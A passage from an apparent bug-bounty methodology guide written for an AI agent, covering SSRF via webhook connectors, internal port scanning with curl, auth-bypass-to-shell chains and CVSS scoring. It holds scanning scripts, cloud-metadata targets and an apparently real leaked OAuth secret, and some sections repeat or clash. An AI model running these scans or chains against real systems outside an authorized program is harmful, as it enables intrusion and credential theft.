   | **Execution** | Actual HTTP request when triggered | Stronger: IP blocklist, `dns_rebind_protection=true` | UrlBlocker catches redirect targets |

   **How to test two-phase validation:**
   - **Creation test**: Create a webhook/connector with a URL that redirects to `http://127.0.0.1:9200/`. If accepted, creation validation did NOT check the redirect target.
   - **Execution test**: Trigger the webhook (push event, test endpoint, etc.) and check the webhook log. Use error codes to distinguish:
     - `200` = Redirect followed, target reached (working SSRF)
     - `403` = External server responded (connection worked, blocked at target)
     - `internal error` = Exception raised (UrlBlocker likely blocked the redirect target)
     - `ECONNREFUSED` / `ETIMEDOUT` = Connection attempted but no service

   **Attackable configurations** (where redirect SSRF works end-to-end):
   - DNS rebinding protection disabled (`dns_rebind_protection: false` skips hostname→IP replacement)
   - Local requests allowed (`allow_local_requests_from_web_hooks_and_services: true`)
   - HTTParty/client follows redirects and does NOT re-validate redirect targets through connection adapter
   
   **Real-world example (GitLab)**: Redirect URLs to `127.0.0.1:9200` or `169.254.169.254` are accepted at creation time (creation bypass confirmed), but execution-time `NewConnectionAdapter` validates redirect targets through `UrlBlocker`, resulting in `internal error`. Only exploitable on instances with permissive self-hosted configuration.
   
5. Target internal services: cloud metadata (169.254.169.254), internal APIs, databases
     2. **Execution**: Does the server follow the redirect? Does it re-validate the target? (302 → internal error = blocked. 302 → 200 = working SSRF)
   - Webhook/connector systems: these often have TWO validation phases — creation (schema/format) and execution (connection). Test them independently.
4. Target internal services: cloud metadata (169.254.169.254), internal APIs, databases

### 6.2a Test Files Document Attack Surfaces (HIGH SIGNAL)

Don't just search source code — **read the unit tests**. Test files for SSRF validation functions often document the exact URL patterns that are considered valid, including internal services:

```javascript
// Edge case: test file documents kong:8000 as a VALID local URL
const validLocalEdgeFunctionsUrls = [
  'http://localhost:54321/functions/v1/test-2',
  'http://kong:8000/functions/v1/hello-world',  // ← Internal API gateway!
  'https://127.0.0.1:54321/functions/v1/test-3',
]
```

**Why this works**: Developers write tests to document expected behavior. The test file becomes an authoritative source for what the code accepts — including internal hostnames that should never be reachable from user-controlled URLs. Tests are rarely audited by security reviewers.

**Search pattern:**
```bash
# Find test files for URL validation functions
grep -rn "valid.*url\|isValid\|sanitize.*url\|allowedHost" --include='*.test.*' . 2>/dev/null
grep -rn "localhost\|127.0.0.1\|internal\|kong\|service\|cluster.local" --include='*.test.*' . 2>/dev/null
```

**What to look for:**
- Internal hostnames (`kong`, `pg-meta`, `gotrue`, `storage-api`) in test data
- Private IPs listed as valid test cases
- Commented-out bypass techniques in tests
- `IS_PLATFORM=false` or similar flags that enable weaker validation

### 6.2 API Key Automation for SSRF Testing (Fast Mode)

When you have API access to a target (API key, session token, OAuth), automate SSRF scanning via REST API instead of clicking through the UI:

```bash
# Pattern: Create connector → Execute → Delete (one-shot scan)
# Works for any target with a programmable connector/webhook API

KEY="your-api-key"
BASE="https://target.com"
HEADERS="Authorization: ApiKey $KEY"  # or "Cookie: session=..."

# Create connector
CID=$(curl -s -X POST "$BASE/api/actions/connector" \
  -H "$HEADERS" -H "kbn-xsrf: true" -H "Content-Type: application/json" \
  -d '{"name":"scan","connector_type_id":".webhook","secrets":{},"config":{"url":"http://TARGET:PORT/","method":"get"}}' \
  | python3 -c "import sys,json; print(json.load(sys.stdin).get('id',''))")

# Execute
curl -s -X POST "$BASE/api/actions/connector/$CID/_execute" \
  -H "$HEADERS" -H "Content-Type: application/json" \
  -d '{"params":{}}'

# Delete
curl -s -X DELETE "$BASE/api/actions/connector/$CID" -H "$HEADERS"
```

**Error code interpretation:**
- `ECONNREFUSED` — Port closed (nothing listening)
- `ETIMEDOUT` — Routable but filtered/no response
- `EHOSTUNREACH` — Not routable (network-level block)
- `ENOTFOUND` — DNS failure
- `200 OK` — Service reachable!

**Common internal targets to scan:**
- `localhost` + standard ports (5601 Kibana, 9200 ES, 3000 dev, 443/8443 HTTPS)
- `0.0.0.0` — listens on all interfaces
- K8s DNS: `kibana:5601`, `elasticsearch:9200`, `service-name.namespace.svc.cluster.local`
- Private subnets: `10.x.x.x`, `172.16-31.x.x`, `192.168.x.x`
- Cloud metadata: `169.254.169.254` (AWS/GCP/Azure), `metadata.google.internal` (GCP)
- Docker bridge: `172.17.0.1`

**Scanning strategy:**
1. First find what's reachable (any response = open port)
2. Then identify the service (check response body for banners)
3. Then exploit (admin APIs, unauthenticated endpoints, config leaks)

### 6.2 File Upload Attacks
- Check `Content-Type` validation bypass
- Symlink attacks in zip extraction
- Path traversal in filename parameter
- XML external entity (XXE) in upload metadata processing

### 6.3 Business Logic Flaws (from Bug Bounty Bootcamp Ch17)
- Currency rounding attacks (fractional cents)
- Negative quantity pricing
- Race conditions in concurrent operations
- Workflow bypass (skip payment step)
- Coupon code brute-force or parameter injection

### 6.4 Auth Bypass → Secret Extraction → RCE (Escalation Chain)

When you find an auth bypass (missing auth, broken wrapper, unprotected handler), treat it as the FIRST STEP, not the final finding. The real impact is what becomes accessible:

**Step 1 — Check for secret leaks via `/api/v1/...` and bare handlers:**
```bash
# Search for bare handlers (no auth wrapper) that leak secrets
grep -rn "export default" apps/*/pages/api/ --include='*.ts' -A10 | grep -E "SERVICE_KEY|TOKEN|SECRET|PASSWORD|api_key"
```
Bare handlers with no auth wrapper are the highest value — they return raw secrets to anyone.

**Step 2 — Check config/settings endpoints:**
```bash
# Config endpoints often leak env vars
grep -rn "env\\." apps/*/pages/api/platform/*/settings* --include='*.ts'
grep -rn "env\\." apps/*/pages/api/platform/*/config* --include='*.ts'
```

**Step 3 — Check SQL query endpoints:**
If the app has a SQL editor or pg-meta-like interface:
```bash
# Look for endpoints that proxy SQL queries
grep -rn "query" apps/*/pages/api/ --include='*.ts' -A5 | grep -i "sql\\|query\\|pg-meta"
# Check if they pass withAuth: true
grep -B5 "query" apps/*/pages/api/platform/pg-meta/ --include='*.ts' | grep "apiWrapper"
```

**Step 4 — Check for SSRF endpoints that chain with auth bypass:**
```bash
# Find endpoints that fetch user-controlled URLs
grep -rn "fetch(" apps/*/pages/api/ --include='*.ts' | grep -v "node_modules" | grep "req\\."
```

**Real-world chain (Supabase):**
1. Auth bypass → `GET /api/v1/projects/default/api-keys` → `SUPABASE_SERVICE_KEY`
2. Auth bypass → `POST /api/platform/pg-meta/default/query` → arbitrary SQL
3. SQL: `COPY (SELECT '') TO PROGRAM '...'` → **shell on DB container**
4. Auth bypass → `POST /api/edge-functions/test` → SSRF to internal services

**Step 5 — Check for unmerged fix branches (vendor awareness check):**
When you find a vulnerability, check whether the vendor already knows about it but hasn't released a fix:
```bash
# Check if a fix branch exists
git branch -a | grep -i "fix\\|auth\\|security\\|middleware"
git log --all --oneline --grep="auth" --grep="apiWrapper" --all-match -10

# Check if the fix branch has been merged to master
git log --oneline origin/master -- apps/studio/lib/api/apiWrapper.ts | head -5
git branch -a --merged origin/master | grep "middleware"

# If the fix exists on a branch but NOT in master:
# - The vendor knows about the issue (strengthens report)
# - No CVE exists (finding is still new)
# - The unmerged fix proves the finding is real and reproducible
```

### 6.5 Catalog/List Endpoint Information Disclosure

**Finding pattern**: Public-facing catalog/list endpoints that return embedded credentials or secrets in nested objects. This is not typical "missing auth on admin endpoint" — it's data that SHOULD BE FILTERED but isn't.

**How it manifests:**
- A public (no auth) or low-auth GET endpoint lists items from a catalog
- Each item has metadata fields (socialApi config, OAuth keys, pricing details)
- Developers filter sensitive fields from the DETAIL endpoint but forget the LIST endpoint
- Or developers include fields "for convenience" that should never be serialized

**Real example (Nutaku catalog — 224 credentials leaked):**
```
GET /v1/catalog/titles?per-page=100  (no auth required)
Each game includes:
  "socialApi": {
    "consumerKey": "144650",
    "consumerSecret": "iZuaevBS=eZt$UDIwotTyqVw5gSRl]4u"
  }
```
These are OpenSocial OAuth 1.0 credentials authenticating game servers to the platform API.

**Testing methodology:**

1. Find the catalog endpoint — look for /catalog, /titles, /products, /items, /games, /resources paths
2. Compare detail vs list responses — /titles/{id} may DIFFER from /titles list
3. Search nested objects for secret/key/token/password fields:
   ```python
   import sys, json
   items = json.load(sys.stdin)
   def find_secrets(obj, path=''):
       if isinstance(obj, dict):
           for k, v in obj.items():
               if any(s in k.lower() for s in ['secret','key','token','password','credential']):
                   print(f'{path}.{k} = {v}')
               find_secrets(v, f'{path}.{k}')
       elif isinstance(obj, list):
           for i, item in enumerate(obj[:5]):
               find_secrets(item, f'{path}[{i}]')
   find_secrets(items)
   ```
4. Test without auth — these endpoints are often public
5. Check ALL list endpoints — /catalog, /events, /users, /products, /games-meta
6. Check nested objects — secrets hide in socialApi, config, metadata, integration, provider, oauth
7. Check pricing data exposure

**Impact**: OAuth credentials let attackers impersonate game/integration servers. Severity depends on what the credential unlocks on its intended API.

When you find an auth bypass (missing auth, broken wrapper, unprotected handler), treat it as the FIRST STEP, not the final finding. The real impact is what becomes accessible:

**Step 1 — Check for secret leaks via `/api/v1/...` and bare handlers:**
```bash
# Search for bare handlers (no auth wrapper) that leak secrets
grep -rn "export default" apps/*/pages/api/ --include='*.ts' -A10 | grep -E "SERVICE_KEY|TOKEN|SECRET|PASSWORD|api_key"
```
Bare handlers with no auth wrapper are the highest value — they return raw secrets to anyone.

**Step 2 — Check config/settings endpoints:**
```bash
# Config endpoints often leak env vars
grep -rn "env\\." apps/*/pages/api/platform/*/settings* --include='*.ts'
grep -rn "env\\." apps/*/pages/api/platform/*/config* --include='*.ts'
```

**Step 3 — Check SQL query endpoints:**
If the app has a SQL editor or pg-meta-like interface:
```bash
# Look for endpoints that proxy SQL queries
grep -rn "query" apps/*/pages/api/ --include='*.ts' -A5 | grep -i "sql\|query\|pg-meta"
# Check if they pass withAuth: true
grep -B5 "query" apps/*/pages/api/platform/pg-meta/ --include='*.ts' | grep "apiWrapper"
```

**Step 4 — Check for SSRF endpoints that chain with auth bypass:**
```bash
# Find endpoints that fetch user-controlled URLs
grep -rn "fetch(" apps/*/pages/api/ --include='*.ts' | grep -v "node_modules" | grep "req\."
```

**Real-world chain (Supabase):**
1. Auth bypass → `GET /api/v1/projects/default/api-keys` → `SUPABASE_SERVICE_KEY`
2. Auth bypass → `POST /api/platform/pg-meta/default/query` → arbitrary SQL
3. SQL: `COPY (SELECT '') TO PROGRAM '...'` → **shell on DB container**
4. Auth bypass → `POST /api/edge-functions/test` → SSRF to internal services

**Step 5 — Check for unmerged fix branches (vendor awareness check):**
When you find a vulnerability, check whether the vendor already knows about it but hasn't released a fix:
```bash
# Check if a fix branch exists
git branch -a | grep -i "fix\|auth\|security\|middleware"
git log --all --oneline --grep="auth" --grep="apiWrapper" --all-match -10

# Check if the fix branch has been merged to master
git log --oneline origin/master -- apps/studio/lib/api/apiWrapper.ts | head -5
git branch -a --merged origin/master | grep "middleware"

# If the fix exists on a branch but NOT in master:
# - The vendor knows about the issue (strengthens report)
# - No CVE exists (finding is still new)
# - The unmerged fix proves the finding is real and reproducible
```

## Phase 7: Open-Source Codebase Audit (TypeScript/Next.js)

For programs with SourceCode in scope (GitHub repos), a systematic codebase audit is more efficient than black-box testing. This methodology targets TypeScript/Next.js codebases — the class where we have the deepest experience.

### 7.1 Initial Reconnaissance

```bash
# Clone and understand the architecture
git clone https://github.com/<org>/<repo>.git
ls apps/                         # Next.js apps (studio, www, docs)
ls packages/                     # Shared packages
find . -name 'middleware.ts'     # Edge middleware (auth gates)
find . -name 'proxy.ts'          # API allowlists for hosted platform
find . -name '*.ts' -o -name '*.tsx' | wc -l  # File count estimate
```

### 7.2 Critical File Patterns

| Pattern | File/Directory | What to Look For |
|---------|---------------|------------------|
| **API routes** | `apps/*/pages/api/` | Auth wrappers, `withAuth` flag |
| **Edge middleware** | `middleware.ts`, `proxy.ts` | URL allowlists, `IS_PLATFORM` gates |
| **Auth wrapper** | `lib/api/apiWrapper.ts` | How auth is enforced (or skipped) |
| **Admin endpoints** | `platform/auth/*/users/` | User CRUD, invites, password reset |
| **SSRF endpoints** | Files with `fetch(`, `axios.get(` | User-controlled URLs in requests |
| **Constants** | `lib/constants.ts`, `proxy.ts` | `HOSTED_SUPPORTED_API_URLS`, `IS_PLATFORM` |

### 7.3 The `apiWrapper` / `withAuth` Anti-Pattern

Many Next.js apps wrap API routes with an auth function controlled by a flag:

```typescript
// lib/api/apiWrapper.ts:
async function apiWrapper(req, res, handler, options?: { withAuth: boolean }) {
  const { withAuth } = options || {}
  if (IS_PLATFORM && withAuth) {       // BOTH must be true → auth runs
    const claims = await apiAuthenticate(req, res)
    if (!claims) return res.status(401)
  }
  return handler(req, res)
}

// SAFE: apiWrapper(req, res, handler, { withAuth: true })
// VULNERABLE (self-hosted): apiWrapper(req, res, handler)  ← no auth!
```

**Hunting commands:**
```bash
# Find ALL endpoints where auth was omitted
grep -rn "apiWrapper(req, res, handler)" apps/*/pages/api/ --include='*.ts'
# Manually filter out ones with { withAuth: true }

# Cross-reference with SERVICE_KEY usage (critical combo)
grep -rn "SERVICE_KEY" apps/*/pages/api/ --include='*.ts'
```

**Impact**: When `IS_PLATFORM=false` (self-hosted), auth checks are completely skipped. Attackers with network access to the self-hosted instance can create/delete admin users, access all storage, modify settings — all using the SUPABASE_SERVICE_KEY embedded in the handler.

### 7.4 The Vercel Edge Proxy Gate (Hosted-Only Protection)

On hosted platforms, a Vercel Edge proxy may block admin endpoints:

```typescript
// proxy.ts — only these endpoints pass through on hosted
const HOSTED_SUPPORTED_API_URLS = [
  '/check-cname', '/edge-functions/test', '/parse-query', ...
]
export function proxy(request) {
  if (IS_PLATFORM && !HOSTED_SUPPORTED_API_URLS.some(
    u => request.nextUrl.pathname.endsWith(u)))
    return Response.json({ message: 'Not supported' }, { status: 404 })
}
```

**Critical nuance**: Even if 100+ endpoints lack `withAuth: true`, only the few in the allowlist are reachable on the hosted platform. Self-hosted installations have NO proxy gate — every endpoint is directly accessible.

### 7.5 SSRF via URL Injection in API Routes

Look for endpoints that accept user-controlled URLs and pass them to `fetch()`:

```typescript
// Unvalidated query param → URL injection
// check-cname.ts:
const { domain } = req.query
fetch(`https://api.example.com/dns?name=${domain}`)  // domain NOT sanitized
// No auth check, no rate limit

// POST body → SSRF (restricted on hosted, open on self-hosted)
// edge-functions/test.ts:
const { url } = req.body
if (isValidEdgeFunctionURL(url, IS_PLATFORM)) {
  const response = await fetch(url, { method, headers, body })  // Server-side fetch!
}
```

**Validation regex analysis** (edge-functions/test):
- **Self-hosted**: `/^https?:\/\/[^\s\/?#]+\/functions\/v[0-9]{1}\/.*$/` — ANY URL with `/functions/v1/xxx` passes
- **Hosted**: `/^https:\/\/[a-z]{20}\.supabase\.(red|co)\/functions\/v[0-9]{1}\/.*$/` — restricted to `*.supabase.co`

### 7.6 Credential Testing Flow

| Key Type | Format | What It Unlocks | Source |
|----------|--------|-----------------|--------|
| Service Role | `eyJ...` JWT (`role: service_role`) | Auth Admin API (project-level) | Dashboard > Settings > API |
| PAT | `sbp_...` | Management API (api.supabase.com) | Dashboard > Account > PAT |
| Anon | `eyJ...` JWT (`role: anon`) | PostgREST, Storage APIs | Dashboard > Settings > API |

## Phase 8: Research Methodology (Book Extraction)

When researching from PDF books at `~/Documents/BOOKS/Hackinh/`:

### PDF Text Extraction
```bash
# Extract chapter headings
pdftotext -layout -f 1 -l 30 book.pdf - | grep -i 'chapter\|part\|section'

# Extract a specific chapter by page range
pdftotext -layout -f 120 -l 150 book.pdf - | head -100

# Search for specific topics within a book
pdftotext -layout book.pdf - | grep -A2 -B2 'keyword\|technique\|attack'

# Extract table of contents
pdftotext -layout -f 5 -l 15 book.pdf - | grep -E '^[A-Z]'
```

### Python-based extraction
```python
import subprocess
result = subprocess.run([
    'pdftotext', '-layout', '-f', str(start_page), '-l', str(end_page), 
    pdf_path, '-'
], capture_output=True, text=True)
lines = result.stdout.split('\n')
for line in lines:
    if keyword in line.lower():
        print(line.strip())
```

### Bookshelf layout
```
~/Documents/BOOKS/Hackinh/
├── Bug Bounty Bootcamp (Vickie Li) — web vuln methodology
├── Hacking APIs (Corey Ball) — API security testing
├── Web Application Hacker's Handbook — classic reference
├── RTFM (Ben Clark) — red team commands
├── Linux Basics for Hackers — OS fundamentals
└── Hacking Wireless Networks For Dummies — wireless
```

## Phase 7: Program Selection

Choosing the right program is a balance of your capabilities and the program's scope/payouts. For a researcher with limited HackerOne submission slots (5 initial), every report must count. Avoid wasting slots on duplicates.

### "Sure Bet" Criteria (for researchers with limited submission slots)

1. **Avoid crowded vulnerability classes**: SSRF is the most-reported bug in nearly every program with URL-fetching features. Vercel's AI SDK SSRF was duplicate #3766258 — someone found it 2 days earlier. SSRF on well-audited programs is a losing bet.
2. **Pick a tech stack you can analyze deeply**: Node.js/TypeScript (Vercel experience) or Ruby on Rails (GitLab experience). You need to read the source code, not just black-box test.
3. **Target newer features**: AI features, chat systems, workflow engines, plugin APIs, import/export. These get less researcher attention than SSRF/XSS/path traversal.
4. **Verify bounty status before investing**: Some programs have suspended bounties (Discourse, Node.js, IBB). Check FireBounty, recent HackerOne hacktivity, or community forums.
5. **Check for recent CVEs in your target**: stack.watch/product/<name> tells you how many CVEs were published recently. 30+/year = active program but also well-audited. 0-5/year = less attention but possibly harder to find bugs.
6. **Prefer programs with SourceCode in scope**: You can clone the repo and do static analysis. Black-box testing on proprietary programs is much harder.

### HackerOne Opportunities Page Workflow

The HackerOne opportunities page (`hackerone.com/opportunities/all`) lists programs you can apply to. Use it for discovery:

1. **Filter by Bounty type** (not Response/VDP) — only bounty programs pay
2. **Filter by SourceCode asset** — programs that let you audit source code
3. **Cross-reference program names with tech stack** — search GitHub repos to find the language
4. **Check program metrics**: High "awarded reports" + low "reporter count" = more reports per researcher = good signal. Low acceptance rate (<70%) = picky triage team.
5. **Check "Triaged by H1" tag** — faster response
6. **Sort by Relevance or check "Updated" tag** — recently updated programs may have new scope

Example programs with SourceCode in scope (from May 2026 research):
- Kubernetes: 72 repos, $100-$10k, Go
- Vercel OSS: 14 repos, $50-$10k, TypeScript/Node.js (already submitting)
- Spotify: 6 repos, $100-$8k, Java/JS
- Cloudflare: 2 repos, $250-$10k, competitive
- Netflix: 1 repo, $300-$25k, complex infrastructure
- OKG: 1 repo, $50-$1M

### Evaluation Checklist
1. **Tech stack fit**: Can you analyze the source code? (Node.js, Ruby, Go, Rust → good. Java, C# → steeper)
2. **Source access**: Is the source open? Can you clone it? Static analysis is more efficient than black-box
3. **Triage responsiveness**: Check HackerOne hacktivity — how fast do they respond? GitLab: 6h target
4. **Payout vs competition**: Well-known programs (GitLab, Vercel) have 8+ years of auditing. Less well-known programs may have lower bounties but less competition
5. **Scope breadth**: Does the program cover the full source code or just a demo instance?
6. **Recent CVEs**: Check stack.watch/product/<name> for recent CVEs — if there are 30+ in the last year, the codebase is actively audited (both good and bad)

### Sources for evaluation
- **FireBounty**: firebounty.com — lists program scopes and policies
- **Stack.watch**: stack.watch/product/<name> — tracks CVE history per product
- **HackerOne hacktivity**: Check publicly disclosed reports for signal quality
- **SECURITY.md**: Many projects have disclosure policies in their GitHub repo

## Phase 8B: Fact-Checking Your Findings (CRITICAL — Do Before Reporting)

### Cross-Program Thinking: Don't Tunnel-Vision

**This is one of the most common workflow mistakes the user will correct you on.** When you find a vulnerability in ONE program, IMMEDIATELY pause and ask: "Where ELSE have I seen this pattern?" Do NOT spend the entire session deep-diving one finding without checking other targets.

**Required workflow — always audit across all active targets before concluding:**
1. Found an SSRF bypass? Quickly check if the same bypass technique works on your other targets' source code.
2. Found an auth bypass? Check if similar auth wrappers (withAuth, IS_PLATFORM patterns) exist in your other codebases.
3. Found an IDOR via unscoped `find()`? Search your other cloned repos for the same pattern.
4. Found a CVSS 10.0? Great — now check if the other targets have the same architectural vulnerability.

**Delegate parallel audits when cross-program scope is large:**
```python
# Use delegate_task with tasks array to audit 3 targets simultaneously
delegate_task(
    tasks=[
        {"goal": "Audit Vercel for auth bypass patterns similar to Supabase", ...},
        {"goal": "Audit Elastic for same pattern", ...},
        {"goal": "Audit GitLab for same pattern", ...},
    ]
)
```

**Why this matters**: The user has multiple cloned repos (Vercel, Elastic, Discourse, GitLab, Supabase, Anthropic). A technique that works on one target often applies to another. Finding 2-3 instances of the same vulnerability class across targets is stronger than a single finding. More importantly, it catches escalation paths you'd miss when focused on one program.

**Example**: The Supabase `apiWrapper` / `withAuth` anti-pattern (auth only when `IS_PLATFORM && withAuth`) turned up 40+ vulnerable endpoints. Once recognized, the same "bare handler exports" search pattern (`grep "export default" pages/api/ --include='*.ts' | grep -v apiWrapper`) could be applied to ANY Next.js codebase to find similar auth omissions.

**Pitfall — don't stop at one research source**: When the user asks you to research escalation techniques, load ALL available sources — books from ~/Documents/BOOKS/Hackinh/, CVEs, online writeups, and ALL current findings — before producing analysis. A response that only covers one target triggers a correction.

### Escalation Chain Thinking

After any finding, ask these 8 questions to maximize impact:

1. **Enumeration** — Are IDs sequential? Can I iterate? Is there a cursor/pagination?
2. **Cross-user access** — Can User A see User B's data?
3. **Bulk extraction** — Can I script this? Is there a rate limit?
4. **Sensitive data in unexpected places** — API keys in config dumps? Passwords in errors?
5. **Chain with other findings** — Does this finding unlock another attack?
6. **Configuration-dependent severity** — Worse when a specific setting is enabled?
7. **Data lifetime** — Is the exposed data still valid?
8. **Unauthenticated vs authenticated** — Requires login or remote?

Before writing a report, fact-check every claim in the escalation chain. A triager who finds one wrong claim will discount the whole report. This applies to ALL vulnerability classes.

### 8B.1 Trace the Data End-to-End

```python
# DON'T: Assume what a serializer exposes based on model attributes
# DO: Read the serializer file explicitly
grep "attributes\|has_one\|has_many" app/serializers/your_serializer.rb

# DON'T: Assume the column stores full data
# DO: Check the migration file for column type
cat db/migrate/2023*.rb | grep -A2 "raw_\|payload\|body\|content"
```

**Key question**: Is `t.string` really a string? In Rails/PostgreSQL, `t.string` creates `character varying(255)` — truncating anything longer. `t.text` is unbounded. If the data you're claiming is leaked is routinely >255 chars, the column type matters enormously.

**Examples from real findings:**
- `t.string :raw_request_payload` → varchar(255). AI prompts (10K+ chars) truncated to 255 chars. Finding drops from High to Medium.
- `t.text :raw_response_payload` → unbounded. Full AI responses captured. Finding stays High.

### 8B.2 Check Migration Files, Not Just Models

The schema info at the bottom of a model file is a COMMENT. The actual column type is in the migration:

```ruby
# Migration file (AUTHORITATIVE):
t.string :raw_request_payload   # → varchar(255)
t.integer :user_id              # → integer (can be 0, which is different from nil)
```

vs.

```ruby
# Model schema info comment (MAY BE STALE):
#  raw_request_payload  :string
#  raw_response_payload :string
```

Always check `db/migrate/` for the authoritative column definition.

### 8B.3 Verify the Authorization Path

Trace the ENTIRE auth chain, not just the first check:

```ruby
# Controller
log = AiApiAuditLog.find(params[:id])  # Step 1: unscoped find
guardian.ensure_can_debug_ai_bot_conversation!(log.topic)  # Step 2: guardian check

# Guardian
def can_debug_ai_bot_conversation?(target)
  return false if anonymous?
  return false if !can_see?(target)  # ← Only checks visibility, NOT ownership
  ...
  user.in_any_groups?(SiteSetting.ai_bot_debugging_allowed_groups_map)
end
```

**Questions to ask**:
1. Does the initial find scope by current_user? (No → IDOR)
2. Does the guardian check verify OWNERSHIP or just VISIBILITY? (Visibility → weak)
3. Is the guardian check gated behind a site setting that might be empty? (Empty → always false = false sense of security)

### 8B.4 Verify the Column Limits Affect Escalation Claims

For each escalation claim, ask: **"Can the data actually fit in the column?"**

| Column Type | Max Size | Can store full prompt? | Impact |
|-------------|----------|----------------------|--------|
| `string` | 255 chars | ❌ No | Truncated exposure |
| `text` | Unlimited | ✅ Yes | Full exposure |
| `jsonb` | ~1GB | ✅ Yes | Full exposure |
| `integer` | 4 bytes | N/A | ID only |

### 8B.5 Test the Endpoint Against the Live Instance

```bash
# Verify the route exists
curl -s -o /dev/null -w "%{http_code}" https://target.com/path

# Verify auth requirements
curl -s https://target.com/path  # Should return 401/403

# Verify with valid auth (if you have it)
curl -s -b "session=..." https://target.com/path

# Verify error behavior (404 vs 403 vs 500)
curl -s -b "session=..." https://target.com/path/99999999
```

Different HTTP status codes reveal different things:
- **401**: Not authenticated (login wall)
- **403**: Authenticated but not authorized (auth gate works)
- **404**: Resource not found OR route hidden (deliberate ambiguity)
- **500**: Unhandled error (could leak stack traces)
- **200**: Success (the data is returned)

### 8B.6 Escalation Thinking: Chain the Impact

For each finding, answer these questions to maximize the report:

1. **Enumeration** — Are IDs sequential? Can I iterate? Is there a cursor/pagination?
2. **Cross-user access** — Can User A see User B's data? Under what conditions? (same topic, same project, same group?)
3. **Bulk extraction** — Can I script this? What's the rate limit? Is there a pagination/cursor leak?
4. **Sensitive data in unexpected places** — Is there an API key in the config dump? A password in the error message? A connection string in the system prompt?
5. **Chain with other findings** — Does this finding reveal data that unlocks another attack? (e.g., audit log IDOR reveals API keys → those keys unlock RCE via the API)
6. **Configuration-dependent severity** — Is this finding worse when a specific site setting is enabled or disabled? (e.g., `ai_bot_debugging_allowed_groups` set to `everyone` vs `staff`)
7. **Data lifetime** — Is the exposed data still valid? (e.g., API keys in old audit logs might be expired)
8. **Unauthenticated vs authenticated** — Does the finding require login (distinct users) or group membership (specific tenants)?

### 8B.7 The Steelman Approach — Test Your Finding from Both Sides

Before writing a report, force yourself to argue AGAINST your own finding. This is called the **steelman approach**: construct the strongest possible counter-argument the vendor/triager would use to dismiss or downgrade your finding.

**Five steelman questions to ask yourself:**

1. **"Why would they gate at P5/P4?"** — Is the data publicly accessible by design? Are the "exposed credentials" actually public API keys with no permission scope? Is the SSRF only DNS resolution without a confirmed connection?
2. **"Why would they say 'intended behavior'?"** — Is the hiddenOnUI flag literally named as a UI-only restriction, making the API exposure by design? Is the permission prompt the explicit security boundary (as with Anthropic MCP)? Is the endpoint documented as public?
3. **"Why would they call this a 'best practice' finding?"** — Is there NO demonstrated impact, just a theoretical weakness? If the answer is "a best practice would be X", the finding is P5 regardless of how severe the theoretical risk sounds.
4. **"Why would they deny the chain?"** — Can a real attacker actually chain Finding A → Finding B? Or is Finding A gated behind admin/authenticated access, meaning the chain is really "an admin can also do X" (expected behavior)?
5. **"Why would they say 'not applicable'?"** — Does this vulnerability only apply to self-hosted configurations while the program's scope is the hosted platform? Does it require a feature flag that's disabled by default?

**Testing your finding from BOTH perspectives before writing a report saves wasted submissions.** The triager's job is to find reasons to downgrade. If you can't steelman-argue against your own finding at P4-P5 and come back with a compelling rebuttal, you haven't thought it through enough.

### 8B.8 When to Downgrade Your Own Finding

Be honest with yourself. A finding with:
- **255-char truncated payloads** is NOT a "full data breach"
- **Requires staff login** is NOT a "remote unauthenticated attack"
- **Depends on a specific site setting** is NOT a "default configuration vulnerability"
- **Gated behind a group membership** is NOT a "vulnerability affecting all users"
- **Hidden by a UI-only flag** is NOT an authentication bypass — it's an API design choice where the flag's name (`hiddenOnUI`) explicitly declares its scope

Triagers spot inflated severity immediately. A Medium finding with honest, well-analyzed impact is worth more than a High finding with unsubstantiated claims. The user values accuracy over inflated severity and will correct overclaims.

### 8B.8 AI Agent Tool-Use CVSS Scoring (Special Case)

SSRF and other vulnerabilities triggered through AI agent tool calls (Claude Code, Copilot, ChatGPT plugins) **do NOT use the standard remote exploit CVSS** despite appearing to work over a network. Two factors reduce the score:

| Factor | Impact | Why |
|--------|--------|-----|
| **PR:L (Low)** | Dropped from PR:N | Attack requires an authenticated user session to initiate. Not unauthenticated remote. |
| **UI:R (Required)** | Dropped from UI:N | User must approve each tool invocation (unless the tool/host is preapproved or preflight checks are disabled) |

**Correct vector for AI agent SSRF:**
```
AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:N/A:N
```

**Base Score: 6.1 (Medium)**
- Exploitability = 8.22 × 0.85 × 0.77 × 0.62 × 0.62 = 2.07
- ISS = 1 − [(1 − 0.56)] = 0.56
- Impact (S:C) = 7.52 × (0.56 − 0.029) − 3.25 × (0.56 − 0.02)^15 = 3.99
- Base = min(3.99 + 2.07, 10) = **6.1**

**When score increases (check each before reporting):**
- Enterprise config `skipPreflight: true` → UI:N → score jumps to 7.5+ (High)
- Target host is in preapproved list → UI:N → 7.5+ for that host
- Tool has no permission prompt (silent tools) → depends on tool's model

**Always check the permission model** before reporting. If the user must click "Approve" to let the tool call proceed, UI:R is correct. Don't default to AV:N/AC:L/PR:N/UI:N — the HackerOne triager will downgrade it.

## Phase 8 (Original): Rails Plugin & Engine Auditing (Plugin/Engine Vulnerability Patterns)

Plugins (Rails Engines) are often less audited than core. This phase applies to any Ruby on Rails app with plugin/extension architecture.

### 8.1 Find Plugin Controllers

```bash
# Find all plugin controllers
find plugins/*/app/controllers -name '*.rb' -type f

# Find which plugins skip CSRF (high signal for webhooks/API endpoints)
for p in plugins/*/; do
  has_skip=$(grep -rl "skip_before_action.*verify_authenticity_token" $p/app/controllers/ 2>/dev/null)
  if [ -n "$has_skip" ]; then
    echo "$(basename $p): $(echo $has_skip | tr '\n' ' ')"
  fi
done

# Find which plugins skip login
grep -rn "skip_before_action.*redirect_to_login_if_required" plugins/*/app/controllers/ --include='*.rb'
```

### 8.2 Check Auth Patterns

For each controller that skips CSRF or login:

1. **Does it accept external data?** — Webhooks, incoming API calls, form submissions
2. **Is there an auth mechanism?** — API key, signature, token, HMAC, basic auth
3. **Is the auth mechanism brute-forcible or guessable?** — Sequential IDs as keys, weak tokens
4. **Are rate limits applied?** — IP-based, token-based, or none at all?
5. **What data flows downstream?** — Does the controller pass `raw_body`, `raw_authorization`, `headers` to a service? This could be an injection vector

### 8.3 Unscoped ID Lookup Pattern (HIGH SIGNAL)

The most common authorization gap in Rails controllers:

```ruby
# VULNERABLE — no user/project scope
def show_debug_info_by_id
  log = AiApiAuditLog.find(params[:id])  # ← Unscoped! Any user with can_see? access
  # guardian.ensure_can_see!(log.topic) is NOT ownership check  → ANY user who can see the topic
  render json: AiApiAuditLogSerializer.new(log, root: false)   # sees other users' data
end

# SAFE — scoped to current user
def show_debug_info_by_id
